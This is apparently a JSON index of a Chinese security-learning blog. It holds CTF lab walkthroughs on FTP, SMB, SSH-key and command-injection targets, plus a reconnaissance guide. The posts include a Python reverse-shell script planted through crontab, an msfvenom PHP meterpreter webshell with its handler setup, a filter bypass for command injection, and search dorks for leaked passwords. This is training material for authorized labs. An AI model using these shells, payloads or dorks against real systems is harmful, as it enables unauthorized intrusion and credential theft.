{"pages":[{"title":"","text":"WHO AM IHacker一个默默无闻的“渗透测试”学习者，朝着成为更高，更远的方向努力。 当前状态目前主要在挖掘漏洞和学习渗透测试相关的知识，扩宽自己的视野。提高编程能力和漏洞挖掘实战经验是我目前要努力的方向。 关注我GitHub @aqyoung","link":"/about/index.html"},{"title":"文章分类","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"CTF-FTP服务后门利用","text":"一、FTP介绍FTP是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念：“下载” (Download)和“上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机上，“上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。 二、实验环境攻击机：kali linux 192.168.43.153靶场机器：192.168.43.138 三、实验过程1、信息探测扫描主机服务信息以及服务版本nmap -sV靶场lP地址 快速扫描主机全部信息nmap-T4-A-v靶场lP地址 2、发现漏洞分析nmap扫描结果，并对结果进行分析，挖掘可以利用的信息；使用seachsploit，查看漏洞信息，找到可利用的溢出代码； 3、使用metasploit进行溢出打开Metasploit 在终端中输入msfconsole输入search对应的软件及版本号 使用exploit-use exploit 查看可以使用的payload-show payload 设置payload–set payload 设置参数–show options-set rhost 靶场lP-set lhost 靶场lP 进行远程溢出-exploit 执行命令id 4、优化shell使用python pty开启终端 python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot; 5、获取Flag一般情况下，靶场机器的lag值是存放在服务器的根目录下，/root/目录。cd/root/Iscat flagwriteup 测试文档 总结文档 四、总结对于开放FTP、SSH、Telnet等服务的系统，可以尝试一些对应服务版本的漏洞代码；对于系统，一定要注意利用现成的EXP来root主机；","link":"/2019/12/14/CTF-FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/"},{"title":"CTF-SMB信息泄露","text":"一、SMB介绍SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔（Intel）在1987年制定的协议，主要是作为Microsoft网络的通讯协议。后来Linux移植了SMB，并称为samba。 SMB协议是基于TCP-NETBIOS下的，一般端口使用为139，445 SMB协议，计算机可以访问网络资源，下载对应的资源文件 二、实验环境攻击机：kali linux 192.168.43.153靶场机器：192.168.43.137目的：获取靶场机器的flag值 三、实验过程1、信息探测： nmap -sV IP 挖掘开放服务信息 nmap -A -v -T4 IP 挖掘靶场全部信息 2、 针对SMB协议弱点分析1.针对SMB协义，使用空口令，若口令尝试登陆，并查看敏感卡载查看； smbclient -L IP smbclient \\‘IP\\share$’尝试登陆上面的sharename结果share可以用空密码进去，并且存在敏感文件 get 敏感文件进一步嗅探果然有发现尝试登陆数据库登陆失败！！！ 2.针对SMB协议远程溢出漏洞进行分析； searchsploit samba 版本号 3、针对HTTP协议弱点分析1.浏览器查看网站； 2.使用dirb nikto探测； 3.寻找突破点，目标登录后台，上传webshell； - 制作webshell msfvenom -p php/meterpreter/reverse_tcp -lhost=攻击机ip地址 Iport=4444 -f raw&gt;/root/Desktop/shell.php - 启动监听msf&gt;use exploit/multi/handlermsf exploift（handler）&gt;set payload php/meterpreter/reverse_tcpmsf exploift（handler）&gt;set lhost 攻击机IP地址msf exploit（handler）&gt;set lport 4444msf exploit（handler）&gt;run - 上传Webshell使用找到的敏感信息登录系统后台，上传webshell。执行webshell（访问具有webshell的php页面） wordpress 上传点theme 404.php执行：http:/靶场IP/wordpress/wp-content/themes/twentyfifteen/404.php 获得反弹的shell 4、查找flag信息优化终端： python -c&quot;import pty;pty.spawn（&apos;/bin/bash&apos;）&quot; 查找敏感信息，提升root权限，查看flag值。 查找用户名：cat/etc/passwd查找密码：在共享目录下的敏感文件，提升权限–su用户名–sudo -l–su sudo很幸运的使用弱密码登陆了进来了 四、总结对于开放139和445端口的机器一定要注意是否可以直接使用smbclient登录到共享目录查找敏感文件。一般情况下lag值都在/root目录下，并且需要提升root权限才能查看内容；","link":"/2019/12/14/CTF-SMB%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"title":"CTF-SSH私钥泄露CTF-SSH服务测试","text":"一、实验环境攻击机：kali linux（192.168.43.153）NAT模式靶机：born2root 后面找机会把链接补上（192.168.0.6）桥接模式 二、实验过程1、当我们拿到目标主机的ip地址先用zenmap进行端口扫描发现开启了22端口和80端口，接下来首先对80端口进行探测 2、用dirb进行目录扫描发现打开链接存在得到几个有用的信息 可能作为ssh的登陆名 得到RSA的私钥 3、用上面得到的rsa私钥和用户名尝试登陆结果比较幸运的是用martin成功登陆了目标主机，不过只是一个普通的权限 4、接下来对得到的靶机进行扩大战果 查看/home目录下的用户 查看/root目录是否存flag.txt 查看/tmp发现了其他的用户，与之前判断的信息相符合 cat/etc/passwd 查看所有用户的列表cat/etc/group 挖掘/etc/crontab下是否有某个用户的定时计划文件发现存在定时执行”.py”文件，但是/tmp里面呢并没有这个文件，于是我们尝试编写一个“反弹的shell” sekurity.py里面的内容为： #/usr/bin/python import os,subprocess,socket s=socket.socket() s.connect(“攻击机ip地址”,”攻击机监听端口”) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([“/bin/sh”,”-i”]) 开启监听这里因为我的kali是用NAT，而靶机用的桥接模式，所以并没有收到反弹的shell 6、尝试对hadi账户ssh进行暴力破解pass_file文件的准备使用cupp进行个性化的密码生成生成后，我们会在其路径下有一个txt文件 使用msfconsole进行ssh登陆使用对应的模块设置参数run进入sessions我们可以看到会话比较简陋Python的模块进行优化 python -c “import pty;pty.spawn(‘/bin/bash’)” 7、成功提权拿到flag 三、总结（1）、初步嗅探 nmap主机发现、端口扫描 目录扫描，查找敏感目录“‘robots.txt等” （2）、扩大战果登录服务器之后，我们需要做以下操作。 1、查看当前用户whoami 2、id查看当前用户的权限 3、查看根目录寻找flag文件 如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组； cat/etc/passwd 查看所有用户的列表cat/etc/group 查看用户组 find/-user 用户名 查看属于某些用户的文件 /tmp 查看缓冲文件目录 （3）、深入挖掘通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要roo权限。挖掘/etc/crontab下是否有某个用户的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。 （4）、具体思路在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登录靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登录靶场机器。CTF中要特别注意/tmp数据缓冲目录以及/etc/crontab设置定时执行的文件","link":"/2019/12/14/CTF-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2/"},{"title":"CTF- 靶场夺旗","text":"一、CTF介绍CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。 二、实验环境攻击机：kali linux（192.168.0.4）桥接模式靶机：192.168.0.100 桥接模式 三、实验过程1、信息探测扫描主机开放的端口号 nmap -p- -T4 靶场lP地址 快速扫描主机全部信息 nmap -T4 -A -v 靶场lP地址 探测敏感信息 nikto -host http://靶场lP地址：端口 dirb http://靶场lP地址：端口 2、深入挖掘分析nmap、nikto扫描结果，挖掘可以利用的信息； 对于大端口非http服务，可以使用nc来探测该端口的banner信息； nc ip地址 端口号根据分析，我们可以得到13337和60000应该是非http服务 对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找lag值；根据分析，可以得到80和9090是http服务，于是我们用浏览器尝试打开 http://ip地址：端口号又发现一个flag值 3、更深入挖掘FTP 匿名登录挖掘敏感信息；由之前的nmap扫描中发现，存在ftp服务，并且可以匿名登陆在浏览器中输入ftp://靶场lP地址 匿名登录tp服务器根目录，查看敏感文件，注意一定要查看源代码； 发现robots.txt文件 在站点robots.txt文件中寻找敏感文件，挖掘敏感文件漏洞； 打开三个目录后发现 http://192.168.0.10/cgi-bin/tracertool.cgi这个URL存在交互，于是进行下一步测试果然存在命令执行的漏洞，于是尝试打开/etc/passwd文件但是cat打不开，应该是被过滤了对于命令执行中，为了绕过对应的限制，可以使用相近命令来代替限制的shell命令如cat more由于之前提示我们Morty的用户的密码可能无法破解，于是我们重点放在Summer账户 4、登录靶场机器获得对应的用户名和密码之后，可以通过ssh来登录系统，查看对应的lag值这里22端口被拒绝连接了分析之前的端口：22222可能可以登录ssh-p port 用户名@靶场lP地址无奈尝试弱密码失败这个时候想起之前的在查看源码，发现了一个password之后输入对应的密码登录系统pwd Is cat more执行命令查看flag值 四、总结注意未知服务的端口，可以使用nc获取对应的banner信息；使用对应相近的shell命令来绕过限制；如cat more对每一个服务都需要进行对应的探测，不放过任何一个可以利用的点","link":"/2019/12/15/CTF-%E9%9D%B6%E5%9C%BA%E5%A4%BA%E6%97%97/"},{"title":"如何进行快速有效的“信息收集”","text":"0x0 背景信息收集对于渗透测试整个过程来说是非常重要的，能否挖掘到漏洞很大一部分取决于信息的收集是否全面，只有想尽办法收集到更多信息，你挖掘到漏洞的可能性越大，本文章主要对目前较为经典与流行的信息收集的一些手段进行总结。 0x1 信息收集方法总结一、域名信息收集1、使用各大whois网站查询 [阿里云whois]： https://whois.aliyun.com/[whois365]： https://www.whois365.com/cn/&gt;[站长之家] ： http://whois.chinaz.com/&gt;[国外的whois] : https://www.whois.com/whois 2、使用kali linux 例如:whois qq.com 3、备案信息查询国内的网站如果通过whois网站没有查询到太多的信息，可以到备案查询，*需要知道的是：国外网站是不需要备案的*** http://www.beianbeian.com/http://beian.miit.gov.cn/publish/query/indexFirst.action 通过上面的网站我们可以收集到一些基本的信息。需要重点关注的是：联系邮箱，联系电话，注册人，DNS解析服务器这些信息到后面可能会是密码的组成，也可以通过邮箱进行社工测试。 二、子域名信息收集（多种方法结合使用）1、子域名挖掘工具如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。这里推荐两款子域名挖掘的工具: subDomainsBrute和layer(windows端)简单的使用 2、搜索引擎挖掘如： 在Google中输入site:qq.com 上面介绍了两个比较常用的谷歌黑客语法，大家可以尝试更多不同语法和组合 3、第三方DNS数据集网站查询： https://fofa.so/http://tool.chinaz.com/subdomainhttps://www.virustotal.com/gui/home/searchhttps://dnsdumpster.com/ 4、证书透明度公开日志枚举： https://crt.sh/http://censys.io/ 5、其他途径： https://phpinfo.me/domainhttp://dns.aizhan.comhttps://github.com/ Github主要是用来分享开源项目的社区，同样可以用Github来针对性的搜索子域名，二级域名，三级域名等等 三、Web站点信息收集CMS识别工具：1、在线工具 http://whatweb.bugscaner.com/look/http://www.yunsee.cn/finger.html 2、本地工具whatweb、御剑web指纹识别程序 https://pan.baidu.com/share/link?shareid=437376&amp;uk=3526832374、 大禹CMS识别程序 https://github.com/Ms0x0/Dayu 四、端口信息收集1、使用nmap探测。nmap -A -v -T4 tags 2、使用masscan探测。 3、使用在线网站探测 http://tool.chinaz.com/port/。 常见端口服务以及入侵方式： 五、敏感信息收集指的是利用搜索引擎搜索目标暴露在互联网上的关联信息。例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息 1、Google hacking数据库： https://www.exploit-db.com/google-hacking-database/例如：查询Access数据：filetype:mdb “standard jet” (password | username | user | pass) 2、获取HTTP响应的方法： 1、利用工具如：浏览器审计工具、Burpsuite等代理截断工具。 2、编写Python脚本requests库参考链接：http://www.python-requests.org/en/master/ 123import requests r=requests.get（&apos;目标’）print（r.headers） Github信息泄露1、Github之邮件配置信息泄露： site:Github.com smtpsite:Github.com smtp@qq.com 2、Github之数据库信息泄露： site:Github.com sa passwordsite:Github.com root passwordsite:Github.com User ID=’sa’；Password 3、Github之svn信息泄露： site:Github.com svnsite:Github.com svn username 4、Github之综合信息泄露： site:Github.com passwordsite:Github.com ftp ftppasswordsite:Github.com 密码site:Github.com内部 六、真实IP地址收集cdn检测1、通过ping是否存在CDN服务器 例如：ping www.baihe.com 会显示：dhntip2、通过在线ping测试使用：ping.chinaz.com 绕过cdn如果没有使用cdn可以使用ping或者www.ip138.com直接查询如果目标使用CDN，需要绕过CDN来获取真实IP地址。 1、内部邮箱源 收集到内部邮箱服务器IP地址2、网站phpinfo文件 phpinfo.php3、分站IP地址，查询子域名 CDN很贵，很有可能分站就不再使用CDN。4、国外访问 https://asm.ca.com/en/ping.php5、查询域名解析记录 https://viewdns.info/ 七、旁站、C段旁站：通俗来讲旁站指的是和目标web服务在同一个服务器的其他站点c段：是和目标服务器ip处在同一个C段的其它服务器，通常大型的企业会买下整个c段 1、站长之家：http://s.tool.chinaz.com/same2、利用Google，语法：site:192.168.0.* 3、利用Nmap 的 -open参数语法：nmap -p 80,8080 –open ip/24 4、K8工具、御剑、北极熊扫描器等 5、在线：http://www.webscan.cc/ 八、waf识别1、wafw00f用于WEB应用防火墙识别 wafw00f -l 显示可以识别的wafwafw00f http://www.microsoft.com 2、nmap nmap www.microsoft.com –script=http-waf-detect.nse 3、发送恶意请求这种方式直接引起waf的机制如图是安全狗的waf触发 九、shodan1、shodan介绍按照官网的介绍shodan是一个物联网的搜索引擎，可以搜索到公网上的一切设备，设备的端口，响应等等，shodan都帮你做了一次的扫描*仅限学习，请勿用于非法用途！** Shodan：https://account.shodan.io/ 2、shodan搜索技巧在Explore搜索框中输入webcam进行搜索。通过关键字 port 指定具体端口号。 例如:port:22 指定搜索22号端口的主机信息。 通过关键字 host指定具体IP地址。 例如: host:61.135.169.121 指定探测IP地址主机信息。 利用city:城市名指定搜索具体城市的内容。 例如： city:hangzhou port:22 3、shodan命令行介绍Shodan获取指定IP地址信息： shodan host ip地址 Shodan获取账号信息： 利用shodan info 查看自身账户的信息。 Shodan获取自身外部IP地址： 使用shodan myip Shodan检测是否有蜜罐： 利用shodan honeyscore 查看是否有蜜罐保护。 写的不全面，望有好的操作望大佬指点指点，谢谢！本文属于@ayoung博客，未经许可禁止转载","link":"/2019/11/04/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%BF%AB%E9%80%9F%E6%9C%89%E6%95%88%E7%9A%84%E2%80%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%9D/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"FTP远程溢出","slug":"FTP远程溢出","link":"/tags/FTP%E8%BF%9C%E7%A8%8B%E6%BA%A2%E5%87%BA/"},{"name":"SMB","slug":"SMB","link":"/tags/SMB/"},{"name":"SSH私钥","slug":"SSH私钥","link":"/tags/SSH%E7%A7%81%E9%92%A5/"},{"name":"命令执行","slug":"命令执行","link":"/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"信息收集","slug":"信息收集","link":"/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"}],"categories":[{"name":"CTF夺旗训练","slug":"CTF夺旗训练","link":"/categories/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83/"},{"name":"web安全","slug":"web安全","link":"/categories/web%E5%AE%89%E5%85%A8/"}]}